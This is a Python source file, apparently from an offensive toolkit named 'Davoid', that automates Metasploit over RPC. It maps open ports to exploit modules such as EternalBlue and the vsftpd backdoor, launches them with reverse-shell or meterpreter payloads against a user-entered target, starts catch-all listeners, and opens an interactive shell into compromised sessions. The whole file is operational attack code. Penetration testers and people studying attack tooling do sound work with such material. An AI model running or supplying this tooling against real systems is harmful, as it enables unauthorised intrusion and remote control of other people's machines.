import os
import sys
import time
import subprocess
import socket
import string
import random
import atexit
import json
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.context import ctx
from core.database import db

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError:
    pass

console = Console()

# Path to persist the daemon password across Davoid sessions
MSF_LOCK_FILE = "/tmp/.davoid_msf.lock"


class MetasploitRPCEngine:
    def __init__(self):
        self.client = None
        self.daemon_process = None
        self.rpc_port = 55554
        self.msfrpcd_path = self.find_msfrpcd()

        # Try to load a previously saved password from a running daemon
        # If none exists, generate a fresh one and save it
        self.password = self._load_or_create_password()

        # Register cleanup as a safety net in case of hard exits
        atexit.register(self.cleanup)

    def _load_or_create_password(self):
        """Loads a persisted RPC password from the lock file, or generates a new one."""
        if os.path.exists(MSF_LOCK_FILE):
            try:
                with open(MSF_LOCK_FILE, "r") as f:
                    data = json.load(f)
                    saved_password = data.get("password")
                    saved_port = data.get("port", self.rpc_port)
                    if saved_password:
                        self.rpc_port = saved_port
                        console.print(
                            "[dim][*] Found existing MSF daemon lock file. Will attempt reattach.[/dim]")
                        return saved_password
            except Exception:
                pass

        # Generate a fresh password and save it
        new_password = ''.join(random.choices(
            string.ascii_letters + string.digits, k=16))
        self._save_lock_file(new_password)
        return new_password

    def _save_lock_file(self, password):
        """Persists the RPC password and port to a temp file for session reattachment."""
        try:
            with open(MSF_LOCK_FILE, "w") as f:
                json.dump({"password": password, "port": self.rpc_port}, f)
        except Exception as e:
            console.print(
                f"[yellow][!] Could not write MSF lock file: {e}[/yellow]")

    def _delete_lock_file(self):
        """Removes the lock file when the daemon is intentionally shut down."""
        if os.path.exists(MSF_LOCK_FILE):
            try:
                os.remove(MSF_LOCK_FILE)
            except Exception:
                pass

    def find_msfrpcd(self):
        """Locates the msfrpcd executable on the system, bypassing sudo PATH issues."""
        common_paths = [
            "/opt/metasploit-framework/bin/msfrpcd",  # Official installer
            "/opt/homebrew/bin/msfrpcd",              # Apple Silicon Mac
            "/usr/local/bin/msfrpcd",                 # Intel Mac
            "/usr/bin/msfrpcd"                        # Kali Linux default
        ]

        try:
            path = subprocess.run(
                ['which', 'msfrpcd'], capture_output=True, text=True).stdout.strip()
            if os.path.exists(path):
                return path
        except Exception:
            pass

        for p in common_paths:
            if os.path.exists(p):
                return p

        return None

    def check_dependencies(self):
        """Verifies pymetasploit3 is installed and msfrpcd is available on the system."""
        try:
            import pymetasploit3
        except ImportError:
            console.print(
                "[bold red][!] Critical Dependency Missing: 'pymetasploit3'[/bold red]")
            return False

        if not self.msfrpcd_path:
            console.print(
                "[bold red][!] Metasploit Framework ('msfrpcd') not found on this system![/bold red]")
            console.print(
                "[yellow]Please ensure Metasploit is installed and accessible.[/yellow]")
            return False

        return True

    def is_port_open(self, port):
        """Checks if a local port is listening."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('127.0.0.1', port)) == 0

    def kill_stuck_daemon(self):
        """Cross-platform method to forcefully free the RPC port."""
        if sys.platform == "darwin":  # macOS
            os.system(
                f"lsof -ti:{self.rpc_port} | xargs kill -9 > /dev/null 2>&1")
        else:  # Linux
            os.system(f"fuser -k {self.rpc_port}/tcp > /dev/null 2>&1")

    def start_daemon(self):
        """Silently boots the Metasploit RPC server in the background."""
        # Only kill and respawn if nothing is listening yet
        if self.is_port_open(self.rpc_port):
            console.print(
                "[dim][*] Port already open — skipping daemon spawn.[/dim]")
            return True

        with console.status("[bold cyan]Booting Headless Metasploit Engine (This takes ~10-15 seconds)...[/bold cyan]", spinner="bouncingBar"):
            cmd = [
                self.msfrpcd_path, "-P", self.password,
                "-n", "-f", "-a", "127.0.0.1",
                "-p", str(self.rpc_port)
            ]
            self.daemon_process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Wait for the daemon to finish initializing and load its massive Ruby framework
            for _ in range(40):
                if self.is_port_open(self.rpc_port):
                    # Give it a 3-second buffer to finalize loading modules
                    time.sleep(3)
                    return True
                time.sleep(1)

        return False

    def connect_rpc(self):
        """
        Connects Davoid to an MSF Daemon.
        First attempts to reattach to an already-running daemon (using the persisted password).
        If that fails, spawns a fresh daemon with a new password.
        """
        if self.client:
            return True

        # Step 1: Try connecting to a daemon that may already be running
        if self.is_port_open(self.rpc_port):
            console.print(
                "[*] Detected existing daemon on port — attempting reattach...")
            try:
                self.client = MsfRpcClient(
                    self.password,
                    server='127.0.0.1',
                    port=self.rpc_port,
                    ssl=True
                )
                console.print(
                    "[bold green][+] Reattached to existing MSF Daemon successfully![/bold green]")
                time.sleep(0.5)
                return True
            except Exception as e:
                console.print(
                    f"[yellow][!] Reattach failed ({e}). Killing old daemon and spawning fresh...[/yellow]")
                self.kill_stuck_daemon()
                time.sleep(1)
                # Generate a new password since we're spawning fresh
                self.password = ''.join(random.choices(
                    string.ascii_letters + string.digits, k=16))
                self._save_lock_file(self.password)

        # Step 2: Spawn a fresh daemon with the current password
        if not self.start_daemon():
            console.print(
                "[bold red][!] Failed to boot Metasploit Daemon. Ensure Metasploit is installed correctly.[/bold red]")
            return False

        console.print("[*] Negotiating API connection...")
        try:
            self.client = MsfRpcClient(
                self.password,
                server='127.0.0.1',
                port=self.rpc_port,
                ssl=True
            )
            console.print(
                "[bold green][+] MSF-RPC Authenticated Successfully![/bold green]")
            time.sleep(1)
            return True
        except Exception as e:
            console.print(
                f"[bold red][!] RPC Connection Failed:[/bold red] {e}")
            return False

    def read_console_until_done(self, msf_console, timeout=30):
        """
        Polls the MSF virtual console until the 'busy' flag clears or the timeout is reached.
        This replaces all fixed sleep-based polling loops for more reliable output capture.
        """
        output = ""
        start = time.time()

        while time.time() - start < timeout:
            result = msf_console.read()

            if result and result.get('data'):
                output += result['data']
                # Break early on clear terminal indicators
                if any(x in result['data'] for x in [
                    "Exploit completed",
                    "session opened",
                    "Command shell session",
                    "Meterpreter session",
                    "failed",
                    "Error:",
                    "No session was created"
                ]):
                    break

            # Stop polling once the console is no longer busy
            if not result.get('busy', True):
                break

            time.sleep(0.5)

        return output

    def auto_exploit(self):
        """Silently configures and launches an exploit via Virtual Console API."""
        default_rhost = ctx.get("RHOST") or "192.168.1.1"
        default_lhost = ctx.get("LHOST") or "127.0.0.1"
        default_lport = ctx.get("LPORT") or "4444"

        target = questionary.text(
            "Target IP (RHOST):", default=default_rhost, style=Q_STYLE).ask()
        if not target:
            return

        rport_input = questionary.text(
            "Target Port (RPORT):", style=Q_STYLE).ask()
        if not rport_input:
            return

        # Safely parse RPORT — give a clear error instead of crashing on bad input
        try:
            rport = int(rport_input)
        except ValueError:
            console.print(
                "[bold red][!] Invalid port number. Please enter a numeric value.[/bold red]")
            return

        lhost = questionary.text(
            "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()
        if not lhost:
            return

        lport = questionary.text(
            "Your Port (LPORT):", default=default_lport, style=Q_STYLE).ask()
        if not lport:
            return

        # Safely parse LPORT as well
        try:
            lport = int(lport)
        except ValueError:
            console.print(
                "[bold red][!] Invalid LPORT. Please enter a numeric value.[/bold red]")
            return

        # Persist the updated values back to ctx for future use in this session
        ctx.set("RHOST", target)
        ctx.set("LHOST", lhost)
        ctx.set("LPORT", str(lport))

        port_exploits = {
            21: "unix/ftp/vsftpd_234_backdoor",
            22: "linux/ssh/exim_pe_injection",
            80: "multi/http/apache_normalize_path_rce",
            445: "windows/smb/ms17_010_eternalblue",
            8080: "multi/http/tomcat_mgr_upload"
        }

        # Show the port-based suggestion as a hint, not a forced default
        module_name = "multi/handler"
        if rport in port_exploits:
            suggested = port_exploits[rport]
            console.print(
                f"[dim][*] Suggestion based on port {rport}: [cyan]{suggested}[/cyan][/dim]")
            module_name = suggested

        custom_mod = questionary.text(
            f"Exploit Module (Default: {module_name}):", default=module_name, style=Q_STYLE).ask()
        if not custom_mod:
            return

        # Smart default payload guessing based on the module name
        default_payload = "windows/x64/meterpreter/reverse_tcp"
        if "unix" in custom_mod or "linux" in custom_mod or "apache" in custom_mod:
            default_payload = "cmd/unix/interact"

        # Interactive Dropdown Menu for Payloads
        payload_choices = [
            "windows/x64/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "cmd/unix/interact",
            "php/meterpreter/reverse_tcp",
            "java/jsp_shell_reverse_tcp",
            "osx/x64/meterpreter_reverse_tcp",
            questionary.Separator(),
            "Custom (Type it manually)"
        ]

        custom_payload = questionary.select(
            "Select Payload:",
            choices=payload_choices,
            default=default_payload if default_payload in payload_choices else None,
            style=Q_STYLE
        ).ask()

        if custom_payload == "Custom (Type it manually)":
            custom_payload = questionary.text(
                "Enter exact MSF Payload path:", default=default_payload, style=Q_STYLE).ask()

        if not custom_payload:
            return

        console.print(Panel(
            f"[bold cyan]Deploying Exploit via Virtual Console API...[/bold cyan]\n"
            f"[white]Target:[/white] {target}:{rport}\n"
            f"[white]Module:[/white] {custom_mod}\n"
            f"[white]Payload:[/white] {custom_payload}",
            border_style="red"
        ))

        # Acquire a virtual console and ensure it is destroyed when we are done
        # to prevent MSF console handle leaks
        msf_console = None
        try:
            msf_console = self.client.consoles.console()

            msf_console.write(f"use {custom_mod}\n")
            time.sleep(0.5)

            msf_console.write(f"set RHOSTS {target}\n")
            msf_console.write(f"set RHOST {target}\n")
            msf_console.write(f"set RPORT {rport}\n")
            msf_console.write(f"set PAYLOAD {custom_payload}\n")

            # Smart Option Parsing: Only set reverse options if the payload is a reverse shell
            if "reverse" in custom_payload.lower() or "meterpreter" in custom_payload.lower():
                msf_console.write(f"set LHOST {lhost}\n")
                msf_console.write(f"set LPORT {lport}\n")

            # Smart Exploit Detection: Check if it's a local exploit that needs a session
            if "local" in custom_mod or "pe_injection" in custom_mod:
                console.print(
                    "\n[yellow][!] This appears to be a Local Privilege Escalation exploit.[/yellow]")
                sess_id = questionary.text(
                    "Enter the active SESSION ID to upgrade:", style=Q_STYLE).ask()
                if sess_id:
                    msf_console.write(f"set SESSION {sess_id}\n")

            # -z runs the exploit and backgrounds the session cleanly, preventing dropped connections
            msf_console.write("exploit -z\n")

            db.log("MSF-Engine", target,
                   f"Attempted {custom_mod} via Console", "INFO")

            # Use the smart polling reader instead of fixed sleep intervals
            console_output = ""
            with console.status("[bold cyan]Executing and capturing MSF output...[/bold cyan]", spinner="dots"):
                console_output = self.read_console_until_done(
                    msf_console, timeout=45)

            if console_output.strip():
                console.print(f"\n[dim]{console_output.strip()}[/dim]")

            # Smart Wait Loop for Session Hooking
            with console.status("[bold cyan]Verifying session status...[/bold cyan]", spinner="bouncingBar"):
                session_found = False
                for _ in range(4):
                    time.sleep(2)
                    sessions = self.client.sessions.list
                    if sessions:
                        console.print(
                            f"\n[bold green][+] Success! {len(sessions)} session(s) active. Use Option 3 to interact.[/bold green]")

                        # Log the full session details for reporting purposes
                        for sid, sdata in sessions.items():
                            db.log(
                                "MSF-Engine",
                                sdata.get('target_host', target),
                                f"Session {sid} | Type: {sdata.get('type', 'unknown')} | "
                                f"Arch: {sdata.get('arch', 'unknown')} | "
                                f"Info: {sdata.get('info', 'N/A')} | "
                                f"Module: {custom_mod}",
                                "CRITICAL"
                            )

                        db.log("MSF-Engine", target,
                               f"Successful Exploit: {custom_mod}", "CRITICAL")
                        session_found = True
                        break

                if not session_found:
                    console.print(
                        "\n[yellow][-] No session established yet. The exploit may have failed, "
                        "the target isn't vulnerable, or it needs more time.[/yellow]")

        except KeyboardInterrupt:
            console.print(
                "\n[yellow][*] Exploit interrupted by user.[/yellow]")

        except Exception as e:
            console.print(
                f"[bold red][!] Exploit execution failed:[/bold red] {e}")

        finally:
            # Always destroy the console handle to prevent MSF console handle leaks
            if msf_console:
                try:
                    msf_console.destroy()
                except Exception:
                    pass

    def list_sessions(self):
        """Pulls live session data from the Metasploit Daemon and logs it to db."""
        sessions = self.client.sessions.list

        if not sessions:
            console.print("[yellow][!] No active MSF sessions found.[/yellow]")
            return

        table = Table(title="Active MSF Sessions (RPC)", border_style="green")
        table.add_column("Session ID", style="cyan")
        table.add_column("Type", style="magenta")
        table.add_column("Target IP", style="white")
        table.add_column("Arch", style="yellow")
        table.add_column("Details", style="dim")

        for session_id, data in sessions.items():
            table.add_row(
                str(session_id),
                data.get('type', 'Unknown'),
                data.get('target_host', 'Unknown'),
                data.get('arch', 'Unknown'),
                data.get('info', 'No Info')
            )

            # Log each session to db whenever the user views the session list
            db.log(
                "MSF-Sessions",
                data.get('target_host', 'Unknown'),
                f"Session {session_id} | Type: {data.get('type', 'unknown')} | "
                f"Arch: {data.get('arch', 'unknown')} | Info: {data.get('info', 'N/A')}",
                "INFO"
            )

        console.print(table)

    def interact_session(self):
        """Opens an interactive terminal to an active Metasploit session."""
        sessions = self.client.sessions.list

        if not sessions:
            console.print(
                "[yellow][!] No active MSF sessions found. Exploit a target first.[/yellow]")
            return

        self.list_sessions()

        session_id = questionary.text(
            "Enter Session ID to interact with (or leave blank to cancel):", style=Q_STYLE).ask()

        if not session_id:
            return

        # MSF returns session IDs as strings in pymetasploit3 — normalize to string for safe comparison
        session_id = str(session_id)
        normalized_sessions = {str(k): v for k, v in sessions.items()}

        if session_id not in normalized_sessions:
            console.print("[bold red][!] Invalid Session ID.[/bold red]")
            return

        session_type = normalized_sessions[session_id].get('type', 'Unknown')
        shell = self.client.sessions.session(session_id)

        console.print(Panel(
            f"[bold green][+] Interacting with {session_type.capitalize()} Session {session_id}[/bold green]\n"
            f"[dim]Type 'exit', 'quit', or 'background' to return to Davoid.[/dim]",
            border_style="green"
        ))

        while True:
            try:
                cmd = questionary.text(
                    f"{session_type.capitalize()} {session_id} >", style=Q_STYLE).ask()

                if not cmd:
                    continue
                if cmd.lower() in ['exit', 'quit', 'background']:
                    break

                # Meterpreter and standard shells use different execution methods in PyMetasploit3
                if session_type == 'meterpreter':
                    output = shell.run_with_output(cmd)
                    if output:
                        console.print(f"[white]{output}[/white]")
                else:
                    shell.write(cmd + '\n')
                    # Buffer time for the shell to process the command
                    time.sleep(1.5)
                    output = shell.read()
                    if output:
                        console.print(f"[white]{output}[/white]")

            except KeyboardInterrupt:
                console.print(
                    "\n[yellow][*] Backgrounding session...[/yellow]")
                break
            except Exception as e:
                console.print(
                    f"[bold red][!] Error interacting with session:[/bold red] {e}")
                break

    def cleanup(self):
        """
        Kills the background daemon when leaving the module.
        Also removes the lock file so the next run spawns fresh.
        """
        if self.daemon_process:
            console.print(
                "[dim][*] Shutting down background Metasploit Daemon...[/dim]")
            self.daemon_process.terminate()
            self.kill_stuck_daemon()  # Ensure the process is completely dead
            self._delete_lock_file()  # Clean up the lock file since we spawned this daemon
        # If we reattached to an existing daemon (daemon_process is None), we leave it running
        # and leave the lock file intact so future sessions can reattach as well

    def run(self):
        draw_header("Metasploit RPC Orchestrator")

        if not self.check_dependencies():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        if not self.connect_rpc():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        try:
            while True:
                choice = questionary.select(
                    "MSF-RPC Operations:",
                    choices=[
                        "1. Auto-Exploit Target",
                        "2. List Active Sessions",
                        "3. Interact with Active Session (Terminal)",
                        "4. Start Generic Catch-All Listener (Multi/Handler)",
                        "Back"
                    ], style=Q_STYLE
                ).ask()

                if not choice or choice == "Back":
                    break

                elif "Auto-Exploit" in choice:
                    self.auto_exploit()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

                elif "List Active" in choice:
                    self.list_sessions()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

                elif "Interact with Active Session" in choice:
                    self.interact_session()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

                elif "Listener" in choice:
                    default_lhost = ctx.get("LHOST") or "0.0.0.0"
                    default_lport = ctx.get("LPORT") or "4444"

                    lhost = questionary.text(
                        "LHOST:", default=default_lhost, style=Q_STYLE).ask()
                    if not lhost:
                        continue

                    lport = questionary.text(
                        "LPORT:", default=default_lport, style=Q_STYLE).ask()
                    if not lport:
                        continue

                    # Safely parse LPORT — prevent crash on bad input
                    try:
                        lport_int = int(lport)
                    except ValueError:
                        console.print(
                            "[bold red][!] Invalid LPORT. Please enter a numeric value.[/bold red]")
                        questionary.press_any_key_to_continue(
                            style=Q_STYLE).ask()
                        continue

                    # Persist the LHOST and LPORT back to ctx
                    ctx.set("LHOST", lhost)
                    ctx.set("LPORT", str(lport_int))

                    payload_choices = [
                        "windows/x64/meterpreter/reverse_tcp",
                        "windows/meterpreter/reverse_tcp",
                        "linux/x64/meterpreter/reverse_tcp",
                        "linux/x86/meterpreter/reverse_tcp",
                        "cmd/unix/interact",
                        "php/meterpreter/reverse_tcp",
                        questionary.Separator(),
                        "Custom (Type it manually)"
                    ]

                    payload = questionary.select(
                        "Select Payload for Listener:",
                        choices=payload_choices,
                        style=Q_STYLE
                    ).ask()

                    if payload == "Custom (Type it manually)":
                        payload = questionary.text(
                            "Enter exact MSF Payload path:",
                            default="windows/x64/meterpreter/reverse_tcp",
                            style=Q_STYLE
                        ).ask()

                    if not payload:
                        continue

                    # Acquire a virtual console and ensure it is destroyed after use
                    msf_console = None
                    try:
                        msf_console = self.client.consoles.console()
                        msf_console.write("use exploit/multi/handler\n")
                        msf_console.write(f"set PAYLOAD {payload}\n")
                        msf_console.write(f"set LHOST {lhost}\n")
                        msf_console.write(f"set LPORT {lport_int}\n")
                        msf_console.write("exploit -j -z\n")

                        console.print(
                            "[bold green][+] Listener started in background.[/bold green]")

                        # Use the smart polling reader instead of a fixed sleep
                        output_data = self.read_console_until_done(
                            msf_console, timeout=10)
                        if output_data.strip():
                            console.print(
                                f"\n[dim]{output_data.strip()}[/dim]")

                        db.log(
                            "MSF-Engine", lhost, f"Listener started on {lhost}:{lport_int} with {payload}", "INFO")

                    except Exception as e:
                        console.print(
                            f"[red][!] Failed to start listener: {e}[/red]")

                    finally:
                        # Always destroy the console handle to prevent MSF console handle leaks
                        if msf_console:
                            try:
                                msf_console.destroy()
                            except Exception:
                                pass

                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

        except KeyboardInterrupt:
            console.print(
                "\n[yellow][*] Caught interrupt, cleaning up...[/yellow]")

        finally:
            self.cleanup()


def run_msf():
    engine = MetasploitRPCEngine()
    engine.run()


if __name__ == "__main__":
    run_msf()
